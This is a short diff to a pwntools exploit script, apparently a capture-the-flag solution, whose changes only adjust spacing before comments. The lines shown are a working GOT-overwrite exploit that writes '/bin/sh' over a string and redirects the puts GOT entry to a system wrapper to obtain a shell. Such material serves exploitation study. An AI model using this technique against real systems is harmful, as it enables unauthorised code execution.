@@ -20,7 +20,7 @@ p.recvuntil('Do you want to edit your description? (y/n): ')
 p.sendline('y')
 
 p.recvuntil('What do you want to change?')
-p.sendline('32')  # 0x6010c0 (goodbye) - 0x6010a0 (buffer) = 32 (decimal)
+p.sendline('32') # 0x6010c0 (goodbye) - 0x6010a0 (buffer) = 32 (decimal)
 
 p.recvuntil('Give me something to replace that with')
 p.sendline('/bin/sh')
@@ -29,7 +29,7 @@ p.recvuntil('Do you want to edit your description? (y/n): ')
 p.sendline('y')
 
 p.recvuntil('What do you want to change?')
-p.sendline('-136')  # 0x601018 (puts.got) - 0x6010a0 (buffer) = -136 (decimal)
+p.sendline('-136') # 0x601018 (puts.got) - 0x6010a0 (buffer) = -136 (decimal)
 
 p.recvuntil('Give me something to replace that with')
 p.sendline(p64(system_wrapper))
